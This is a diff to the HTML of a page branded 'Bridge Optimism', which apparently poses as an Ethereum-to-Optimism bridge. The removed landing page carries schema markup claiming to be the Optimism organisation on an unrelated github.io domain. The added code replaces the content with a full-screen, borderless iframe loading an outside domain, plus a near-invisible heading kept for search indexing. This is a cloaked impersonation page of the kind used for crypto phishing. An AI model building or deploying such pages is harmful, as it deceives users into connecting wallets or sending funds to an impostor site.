@@ -103,70 +103,19 @@ p{margin:0}
   }
   </style>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Bridge Optimism</a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://optimistic.etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">OP Explorer</a>
-      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
-      <a href="https://l2beat.com/scaling/projects/optimism" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
-    </nav>
-    <span class="sp"></span>
-    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="stage">
-    <h1>Bridge Optimism</h1>
-    <p class="sub"><strong>Bridge Optimism</strong> moves ETH and tokens between Ethereum and Optimism through a fast, low-fee route.</p>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <section class="card" aria-label="Bridge route">
-      <div class="route">
-        <div class="leg">
-          <span class="lbl">From</span>
-          <span class="chip">
-            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
-            <span class="t">ETH</span>
-          </span>
-        </div>
-        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
-        <div class="leg">
-          <span class="lbl">To</span>
-          <span class="chip">
-            <img class="ic" src="op.png" width="26" height="26" alt="OP">
-            <span class="t">OP</span>
-          </span>
-        </div>
-      </div>
-      <a class="act" href="dashboard/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-      <p class="note">Preview only &mdash; rates, routes and fees are shown in the app.</p>
-    </section>
-  </main>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Bridge Optimism
+  </h1>
 
-  <footer class="foot">
-    <b>Bridge Optimism</b> &mdash; 2026
-  </footer>
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Bridge Optimism", "inLanguage": "en" },
-      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Optimism", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://www.optimism.io/","https://x.com/Optimism","https://github.com/ethereum-optimism","https://docs.optimism.io/"] },
-      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Bridge Optimism", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
-    ]
-  }
-  </script>
-
-  <script>
-  (function(){
-    "use strict";
-    var root=document, btn=root.querySelector('[data-dir]');
-    if(!btn) return;
-    btn.addEventListener('click', function(){
-      var chips=root.querySelectorAll('.leg .chip');
-      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
-    });
-  })();
-  </script>
 </body>
 </html>
